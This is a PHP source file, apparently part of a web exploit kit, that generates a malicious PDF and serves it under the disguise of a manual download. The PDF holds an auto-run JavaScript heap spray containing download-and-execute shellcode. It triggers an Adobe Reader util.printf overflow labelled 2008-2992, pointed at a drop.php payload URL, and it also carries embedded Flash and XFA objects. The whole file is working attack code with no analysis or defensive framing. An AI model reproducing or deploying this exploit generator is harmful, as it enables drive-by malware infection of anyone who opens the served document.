<?php


function generate_swf() {
	$swf = 'FWS';
	return $swf;
}

function generate_js($url) {
	$js = '';
	$js = $js . 'var k = \'60000\';';
	$js = $js . 'var k1 = 0x40000;';
	$js = $js . 'var k2 = 1450;';
	$js = $js . 'var code = \'' . shellcode_dl_exec_js( $url ) . '\';';
	$js = $js . 'var n = \'\u4b4f\u4027\';';
	$js = $js . 'var a = \'\';';
	$js = $js . 'for (b = 128; b >= 0; --b) a += n;';
	$js = $js . 'c = a + code;';
	$js = $js . 'd = n;';
	$js = $js . 'e = 20;';
	$js = $js . 'f = e + c.length;';
	$js = $js . 'while (d.length < f) d += d;';
	$js = $js . 'g = d.substring(0, f);';
	$js = $js . 'h = d.substring(0, d.length - f);';
	$js = $js . 'while(h.length + f < k1) h = h + h + g;';
	$js = $js . 'i = new Array();';
	$js = $js . 'for (j = 0; j < k2; j++) i[j] = h + c;';
	$js = $js . 'var s = 10;';
	$js = $js . 's = s - 10;';
	$js = $js . 'var st = \'.f%\';';
	$js = $js . 'var p = st.substring(2,3);';
	$js = $js . 'var dot = st.substring(0,1);';
	$js = $js . 'var lF = st.substring(1,2);';
	$js = $js . 'var pkdk1f = p + k + dot + k + lF;';
	$js = $js . 'util.printf(pkdk1f, s);';
	return $js;
}

function generate_pdf($url) {
	$js = generate_js( $url );
	$js = pdf_FlateEncode( $js );
	$jslen = strlen( $js );
	$swf = pdf_FlateEncode( generate_swf(  ) );
	$swflen = strlen( $swf );
	$swfname = 'test.swf';
	$eol = '
';
	$endobj = 'endobj' . $eol;
	$xref = array(  );
	$pdf = '%PDF-1.5' . $eol;
	$pdf = $pdf . '%' . RandomNonASCIIString( 4 ) . $eol;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 1 ) . '<</Type/Catalog';
	$pdf = $pdf . '/Pages ' . ioRef( 3 );
	$pdf = $pdf . '/OpenAction ' . ioRef( 5 );
	$pdf = $pdf . '/AcroForm ' . ioRef( 17 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 3 ) . '<</Type/Pages/Count 1/Kids [' . ioRef( 4 ) . ']>>' . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 4 ) . '<</Type/Page/Parent ' . ioRef( 3 );
	$pdf = $pdf . '/Annots [' . ioRef( 7 ) . '] ';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 5 ) . '<</Type/Action/S/JavaScript/JS ' . ioRef( 6 ) . '>>' . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 6 ) . '<</Length ' . $jslen . '/Filter[/FlateDecode]>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $js . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 7 ) . '<</Type/Annot/Subtype/RichMedia';
	$pdf = $pdf . '/Rect [20 20 187 69] ';
	$pdf = $pdf . '/RichMediaSettings ' . ioRef( 8 );
	$pdf = $pdf . '/RichMediaContent ' . ioRef( 9 );
	$pdf = $pdf . '/NM (' . $swfname . ')';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 8 );
	$pdf = $pdf . '<</Type/RichMediaSettings/Subtype/Flash';
	$pdf = $pdf . '/Activation ' . ioRef( 10 );
	$pdf = $pdf . '/Deactivation ' . ioRef( 11 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 9 );
	$pdf = $pdf . '<</Type/RichMediaContent';
	$pdf = $pdf . '/Assets ' . ioRef( 12 );
	$pdf = $pdf . '/Configurations [' . ioRef( 14 ) . ']';
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 10 );
	$pdf = $pdf . '<</Type/RichMediaActivation/Condition/PO>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 11 );
	$pdf = $pdf . '<</Type/RichMediaDeactivation/Condition/XD>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 12 );
	$pdf = $pdf . '<</Names [(' . $swfname . ') ' . ioRef( 13 ) . ']>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 13 );
	$pdf = $pdf . '<</Type/Filespec /EF <</F ' . ioRef( 16 ) . '>> /F(' . $swfname . ')>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 14 );
	$pdf = $pdf . '<</Type/RichMediaConfiguration/Subtype/Flash';
	$pdf = $pdf . '/Instances [' . ioRef( 15 ) . ']>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 15 );
	$pdf = $pdf . '<</Type/RichMediaInstance/Subtype/Flash';
	$pdf = $pdf . '/Asset ' . ioRef( 13 );
	$pdf = $pdf . '>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 16 ) . '<</Type/EmbeddedFile/Length ' . $swflen . '/Filter[/FlateDecode]>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $swf . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 17 );
	$pdf = $pdf . '<</XFA ' . ioRef( 18 ) . '>>' . $eol;
	$pdf = $pdf . $endobj;
	$xfa = '<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>';
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 18 ) . '<</Length ' . strlen( $xfa ) . '>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $xfa . $eol;
	$pdf = $pdf . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xrefPosition = strlen( $pdf );
	$pdf = $pdf . 'xref' . $eol;
	$pdf = $pdf . '0 ' . ( count( $xref ) + 1 ) . $eol;
	$pdf = $pdf . '0000000000 65535 f' . $eol;
	$i = 0;

	while ($i < count( $xref )) {
		$temp = sprintf( '%010d 00000 n', $xref[$i] );
		$pdf = $pdf . $temp . $eol;
		++$i;
	}

	$pdf = $pdf . 'trailer' . $eol;
	$pdf = $pdf . '<</Size ' . ( count( $xref ) + 1 ) . '/Root ' . ioRef( 1 ) . '>>' . $eol;
	$pdf = $pdf . 'startxref' . $eol;
	$pdf = $pdf . $xrefPosition . $eol;
	$pdf = $pdf . '%%EOF' . $eol;
	return $pdf;
}

include( 'config.php' );
include( 'include/util.php' );
include( 'include/shellcode.php' );
$pdf = generate_pdf( $config_url . '/drop.php?e=Adobe-2008-2992' );
header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
header( 'Cache-Control: no-cache' );
header( 'Pragma: no-cache' );
header( 'Accept-Ranges: bytes
' );
header( 'Content-Length: ' . strlen( $pdf ) . '
' );
header( 'Content-Disposition: inline; filename=manual20082992.pdf' );
header( '
' );
header( 'Content-Type: application/pdf

' );
echo $pdf;
?>
